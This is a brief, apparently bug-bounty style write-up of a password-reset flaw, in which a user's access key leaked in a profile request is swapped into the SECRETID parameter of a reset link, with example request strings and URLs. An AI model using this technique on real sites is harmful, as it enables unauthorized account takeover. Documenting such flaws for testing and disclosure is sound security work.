## password overwrite

look forward to finding can you find out how reset password link is working (email) and can you manipulate link?

`http://site.ir/account/forgotPassword/chooseNewPassword/**?SECRETID=23irj3it3o**`

the link give SECRETID each time we have click on reset password

if we look at the profile request we find each user have access key like SERVERID

`user=username&public_key=b55d4d&private_key=0FEBF3&a5a06f09cc4afe95f8b314e63cf7f74399a2d7ab7e39d31fe90accee5d22=**634346c2cbe8e242d52f1443a8511f51211111c9a4f8b384945ce5d4c92c**`

and what if we replace the Access key to that Secret ID in email?

like this:

`http://vulnerable-target/account/forgotPassword/chooseNewPassword/**?SECRETID=634346c2cbe8e242d52f1443a8511f51211111c9a4f8b384945ce5d4c92c**`
